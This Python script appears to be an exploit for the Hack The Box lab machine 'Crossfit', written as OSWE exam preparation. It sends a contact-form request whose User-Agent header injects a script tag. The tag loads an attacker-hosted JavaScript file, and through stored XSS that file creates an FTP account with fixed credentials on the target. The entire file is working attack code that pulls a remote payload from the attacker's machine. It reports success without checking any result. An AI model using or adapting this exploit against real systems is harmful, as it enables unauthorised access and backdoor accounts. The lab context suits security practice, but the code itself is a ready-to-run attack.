import requests
import argparse
import traceback
from urllib.parse import urljoin


def CreateFTPUser(lhost):
    """
    IMPORTANT:
    for the script to create an FTP user, you must host https://github.com/solimanalmansor/OSWE-Prep/blob/main/Crossfit/CreateFTPUser.js
    on yor python server on port 80
    """
    url = "http://gym-club.crossfit.htb:80/blog-single.php"
    headers = {"User-Agent": f"<script src=\"http://{lhost}/CreateFTPUser.js\"></script>", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://gym-club.crossfit.htb"}
    data = {"name": "John Doe", "email": "john@doe.ltd", "phone": "123456789", "message": "<script>", "submit": "submit"}
    try:
        print("[*] Triggering the XSS vulnerability...")
        requests.post(url, headers=headers, data=data)
        print("[+] FTP user created successfully. Please login with johndoe:password123")
    except Exception as e:
        print("[-] Failed to trigger the XSS vulnerability: ", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser(description="Create an FTP user on the server")
    parser.add_argument("lhost", help="Attacker machine's IP")
    args = parser.parse_args()

    CreateFTPUser(args.lhost)

if __name__ == "__main__":
    main()
